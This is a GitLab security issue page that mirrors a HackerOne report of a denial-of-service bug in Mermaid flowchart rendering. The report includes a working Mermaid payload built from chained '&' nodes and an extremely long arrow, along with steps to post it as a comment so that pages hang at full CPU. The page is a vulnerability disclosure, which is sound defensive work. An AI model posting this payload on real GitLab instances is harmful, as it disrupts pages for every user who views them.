=== Content from gitlab.com_8c949cf4_20250114_201239.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# DOS via Flowchart TB Mermaid

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2137421](https://hackerone.com/reports/2137421)** by `toukakirishima` on 2023-09-06, assigned to [@ottilia\_westerlund](/ottilia_westerlund "Ottilia Westerlund"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I found a DOS vulnerability when add comment with Flowchart TB Mermaid, as an attacker I can make DoS in any section with comments (Issues, Merge requests, Milestones, Snippets, Wiki pages, Markdown documents inside repositories, Epics). And it takes a while to load, and uses 100% CPU.

My specification :

RAM : 40 GB

CPU : 12 CPUs 3.6 GHz AMD Ryzen 5 2600X

Browser : Mozilla Firefox & Google Chrome (Latest Version)

##### Steps to reproduce

1. Create comment with Flowchart TB Mermaid (example on Issue)

Payload :

```
flowchart TB
    A & A & A & A & A & A & A & A ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->  C & D & E & F & G & H & I & J & K & L & M & N & O & P & Q & R & S & T & U & V & W & X & Y & Z

flowchart TB
    A & A & A & A & A & A & A & A ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->  C & D & E & F & G & H & I & J & K & L & M & N & O & P & Q & R & S & T & U & V & W & X & Y & Z

flowchart TB
    A & A & A & A & A & A & A & A ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->  C & D & E & F & G & H & I & J & K & L & M & N & O & P & Q & R & S & T & U & V & W & X & Y & Z
```

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f17f1c139c9bdc52f4087987848642565d7327d7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63623466626631362d363237662d346430302d393338302d6262383736613730666363362f696d6167652e706e67)

2. Reload the page. And you will load the page very long.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/981d2632814353fb17c7f1ebd4a810dc01345237/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33663431306433302d646632302d343563382d623836612d6236376364626234663930322f696d6167652e706e67)

##### POC

[bandicam\_2023-09-06\_14-54-12-196.mp4](https://user-content.gitlab-static.net/b17796c2dacef3cb2a543a942a4632d5d1712445/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65326136313630652d306136322d343963652d396532392d6232636636323932336332302f62616e646963616d5f323032332d30392d30365f31342d35342d31322d3139362e6d7034 "Download 'bandicam_2023-09-06_14-54-12-196.mp4'")

##### Output of checks

This bug happens on GitLab.com

#### Impact

Attacker can make DoS in any section with comments (Issues, Merge requests, Milestones, Snippets, Wiki pages, Markdown documents inside repositories, Epics).

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/cb4fbf16-627f-4d00-9380-bb876a70fcc6/image.png)
* [image.png](https://h1.sec.gitlab.net/a/3f410d30-df20-45c8-b86a-b67cdbb4f902/image.png)
* [bandicam\_2023-09-06\_14-54-12-196.mp4](https://h1.sec.gitlab.net/a/e2a6160e-0a62-49ce-9e29-b2cf62923c20/bandicam_2023-09-06_14-54-12-196.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


